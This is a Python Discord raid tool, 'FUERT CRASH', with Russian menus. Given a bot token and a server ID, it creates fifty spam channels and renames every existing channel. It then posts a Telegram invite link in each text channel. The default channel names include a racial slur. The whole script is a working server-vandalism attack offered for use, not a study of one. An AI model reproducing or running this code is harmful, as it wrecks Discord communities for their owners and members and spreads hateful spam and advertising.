#!/usr/bin/env python3
import discord
from discord.ext import commands
import asyncio
import json
import os
import sys
import time
import random
import subprocess

# === ЦВЕТА (тёмно-синий, голубой, тёмно-синий) ===
COLORS = ["\033[34m", "\033[36m", "\033[34m"]
RESET = "\033[0m"
RED = "\033[91m"

# === КРАСНЫЙ АРТ ===
RED_ART = f"""
{RED}______________¶¶¶{RESET}
{RED}_____________¶¶_¶¶¶¶{RESET}
{RED}____________¶¶____¶¶¶{RESET}
{RED}___________¶¶¶______¶¶{RESET}
{RED}___________¶¶¶_______¶¶{RESET}
{RED}__________¶¶¶¶________¶¶{RESET}
{RED}__________¶_¶¶_________¶¶{RESET}
{RED}__________¶__¶¶_________¶¶____¶¶{RESET}
{RED}__________¶__¶¶__________¶¶¶¶¶¶¶{RESET}
{RED}_________¶¶__¶¶¶______¶¶¶¶¶¶___¶{RESET}
{RED}_________¶¶___¶¶__¶¶¶¶¶¶__¶¶{RESET}
{RED}_______¶¶_¶____¶¶¶¶________¶¶{RESET}
{RED}______¶¶__¶¶___¶¶__________¶¶{RESET}
{RED}_____¶¶____¶¶___¶¶__________¶¶{RESET}
{RED}___¶¶_______¶¶___¶¶_________¶¶{RESET}
{RED}___¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶_________¶{RESET}
{RED}_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶________¶¶{RESET}
{RED}¶¶__¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶______¶¶{RESET}
{RED}¶¶¶¶¶___¶______¶___¶¶¶¶¶_____¶¶{RESET}
{RED}________¶¶¶¶¶¶¶¶______¶¶¶¶¶_¶¶{RESET}
{RED}______¶¶¶¶¶¶¶¶¶¶¶________¶¶¶¶{RESET}
{RED}______¶¶¶¶¶¶¶¶¶¶¶¶{RESET}
{RED}______¶__¶¶_¶¶¶¶¶¶{RESET}
{RED}_____¶¶______¶___¶{RESET}
{RED}_____¶¶_____¶¶___¶{RESET}
{RED}_____¶______¶¶___¶{RESET}
{RED}____¶¶______¶¶___¶¶{RESET}
{RED}____¶¶______¶¶___¶¶{RESET}
{RED}___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RESET}
{RED}__¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶¶{RESET}
{RED}__¶¶________¶¶¶___{RESET}
"""

def clear_screen():
    """Очистка терминала (работает в iSH)"""
    os.system('clear' if os.name == 'posix' else 'cls')

def slow_print(text, delay=0.03, color_cycle=True):
    """Анимация печати с переливающимся цветом"""
    for i, char in enumerate(text):
        if color_cycle:
            color = COLORS[i % len(COLORS)]
        else:
            color = RED
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_menu():
    """Главное меню (только 2 пункта)"""
    clear_screen()
    print(RED_ART)
    slow_print("\n🔥 FUERT CRASH 🔥", 0.03, color_cycle=False)
    print()
    slow_print("1. Ввести данные (токен, ID, настройки)", 0.02)
    slow_print("2. ЗАПУСТИТЬ (краш + переименование + рассылка)", 0.02)
    slow_print("0. Выход", 0.02)
    print()

# === КОНФИГ ===
CONFIG_FILE = "fuert_config.json"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        default = {
            "token": "",
            "guild_id": "",
            "channel_name": "FUERT FUCK",
            "spam_name": "fuck-off-niga-by-DADILK",
            "tg_link": "https://t.me/ZET_Clumsy"
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(default, f, indent=4)
        return default
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

def input_all_data():
    """Ввод всех данных"""
    clear_screen()
    print(RED_ART)
    slow_print("\n⚙️ ВВОД ДАННЫХ ⚙️", 0.03, color_cycle=False)
    print()
    
    token = input(f"{COLORS[0]}Токен бота: {RESET}")
    guild_id = input(f"{COLORS[1]}ID сервера: {RESET}")
    channel_name = input(f"{COLORS[0]}Название канала (ENTER = FUERT FUCK): {RESET}") or "FUERT FUCK"
    spam_name = input(f"{COLORS[1]}Имя спам-каналов (ENTER = fuck-off): {RESET}") or "fuck-off-niga-by-DADILK"
    tg_link = input(f"{COLORS[0]}Telegram ссылка (ENTER = https://t.me/ZET_Clumsy): {RESET}") or "https://t.me/ZET_Clumsy"
    
    config = {
        "token": token,
        "guild_id": guild_id,
        "channel_name": channel_name,
        "spam_name": spam_name,
        "tg_link": tg_link
    }
    save_config(config)
    
    slow_print("\n✅ Данные сохранены!", 0.03)
    time.sleep(1.5)

# === ОСНОВНАЯ ФУНКЦИЯ ===
async def run_attack():
    """Запуск всех действий"""
    config = load_config()
    
    if not config["token"] or not config["guild_id"]:
        clear_screen()
        print(RED_ART)
        slow_print("\n❌ Сначала введите данные (пункт 1)", 0.03, color_cycle=False)
        time.sleep(2)
        return
    
    clear_screen()
    print(RED_ART)
    slow_print("\n🚀 ЗАПУСК АТАКИ НА ВАШЕМ СЕРВЕРЕ 🚀", 0.03, color_cycle=False)
    print()
    
    token = config["token"]
    guild_id = int(config["guild_id"])
    channel_name = config["channel_name"]
    spam_name = config["spam_name"]
    tg_link = config["tg_link"]
    
    bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
    guild = None
    
    @bot.event
    async def on_ready():
        nonlocal guild
        slow_print(f"✅ Бот {bot.user} подключён!", 0.02)
        guild = bot.get_guild(guild_id)
        
        if not guild:
            slow_print("❌ Сервер не найден! Проверьте ID", 0.03)
            await bot.close()
            return
        
        slow_print(f"✅ Сервер: {guild.name}\n", 0.02)
        
        # 1. Краш канала (создание каналов)
        slow_print("🚨 СОЗДАЮ 50 КАНАЛОВ...", 0.03)
        for i in range(50):
            try:
                await guild.create_text_channel(f"{spam_name}-{i}")
                slow_print(f"✅ Создан #{spam_name}-{i}", 0.01)
                await asyncio.sleep(0.5)
            except:
                slow_print("❌ Ошибка/лимит", 0.03)
        
        # 2. Переименование всех каналов
        slow_print("\n🏷️ ПЕРЕИМЕНОВЫВАЮ ВСЕ КАНАЛЫ...", 0.03)
        for channel in guild.channels:
            try:
                await channel.edit(name=channel_name[:100])
                slow_print(f"✅ {channel.name} → {channel_name}", 0.01)
                await asyncio.sleep(0.5)
            except:
                pass
        
        # 3. Рассылка приглашений
        slow_print("\n📨 РАССЫЛАЮ ПРИГЛАШЕНИЯ...", 0.03)
        for channel in guild.text_channels:
            try:
                await channel.send(f"🔥 ПРИСОЕДИНЯЙСЯ: {tg_link}")
                slow_print(f"✅ Отправлено в #{channel.name}", 0.01)
                await asyncio.sleep(0.3)
            except:
                pass
        
        slow_print("\n✔️ ВСЁ ГОТОВО!", 0.03)
        await asyncio.sleep(3)
        await bot.close()
    
    try:
        await bot.start(token)
    except Exception as e:
        clear_screen()
        print(RED_ART)
        slow_print(f"\n❌ Ошибка: {e}", 0.03, color_cycle=False)
        slow_print("Проверьте токен и ID сервера", 0.03)
        time.sleep(3)

# === ГЛАВНЫЙ ЦИКЛ ===
async def main():
    while True:
        print_menu()
        choice = input(f"{COLORS[0]}Выбор: {RESET}")
        
        if choice == "1":
            input_all_data()
        elif choice == "2":
            await run_attack()
        elif choice == "0":
            clear_screen()
            slow_print("Выход...", 0.03, color_cycle=False)
            break
        else:
            slow_print("Неверный ввод", 0.03)
            time.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
